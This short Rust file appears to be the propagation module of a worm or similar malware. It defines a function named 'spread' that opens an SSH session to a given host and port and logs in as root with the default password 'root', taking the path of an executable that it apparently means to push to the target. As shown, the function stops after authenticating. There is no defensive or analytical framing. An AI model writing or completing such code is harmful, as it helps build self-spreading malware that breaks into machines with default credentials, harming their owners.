use ssh2::Session;
use std::{net::TcpStream, path::PathBuf};

pub fn spread(executable_path: PathBuf, host_port: &str) -> Result<(), crate::Error> {
    let tcp = TcpStream::connect(host_port)?;
    let mut sess = Session::new().unwrap();
    sess.set_tcp_stream(tcp);
    sess.handshake().unwrap();

    sess.userauth_password("root", "root")?;
    assert!(sess.authenticated());
    println!("Authenticated");

    Ok(())
}
